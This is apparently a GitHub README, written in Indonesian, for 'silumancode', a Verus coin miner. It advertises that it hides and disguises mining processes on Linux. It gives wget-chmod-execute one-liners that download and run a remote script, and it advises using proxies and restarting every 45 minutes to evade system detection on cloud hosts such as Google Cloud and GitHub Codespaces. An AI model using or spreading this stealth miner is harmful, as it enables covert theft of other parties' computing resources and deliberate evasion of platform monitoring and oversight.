# silumancode
miner verus coin yang mampu menyembunyikan dan menyamarkan proses mining di sistem linux
## install dependence :
 apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
## Penggunaan
wget https://github.com/x011-al/silumancode/raw/refs/heads/main/sh && chmod +x sh && ./sh wallet.namaminer pool thread y/n
### Keterangan :
        - wallet : alamat walet verus miner anda.
        - pool   : pool mining verus coin (usahakan menggunakan proxy).
        - thread : jumlah thread processor yang akan digunakan (usakan tidak menggunakan thread maksimal yang tersedia).
        - y/n    : opsi untuk menampilkan proses mining dari miner (y untuk menampilkan, no tidak menampilkan).
### example
wget https://github.com/x011-al/silumancode/raw/refs/heads/main/sh && chmod +x sh \
&& ./sh RP6jedjfhjfkkfjt1.minervps1 stratum+tcp://eu.luckpool.net 2 n
![tampilan example](images/cmsil.png)
### example II
wget https://github.com/x011-al/silumancode/raw/refs/heads/main/sh && chmod +x sh \
&& ./sh RP6jedjfhjfkkfjt1.minervps1 stratum+tcp://eu.luckpool.net 2 y
![tampilan example II](images/cmsil2.png)
### Catatan Tambahan
1. gunakan proxy untuk memaksimalkan proses penyamaran proses mining, untuk pembuatan proxy miner bisa menghubungi contak wa : 085217993737
2. proses miner akan di restart setiap 45 menit (untuk menghindari deteksi system)
3. berfungsi di vps selain colab. (google cloud, codespace github dan vps lainnya)
4. kode ini hanya sementara untuk penggunaan jangka panjang dan mining coin lain, bisa menghubungi contak wa : 085217993737
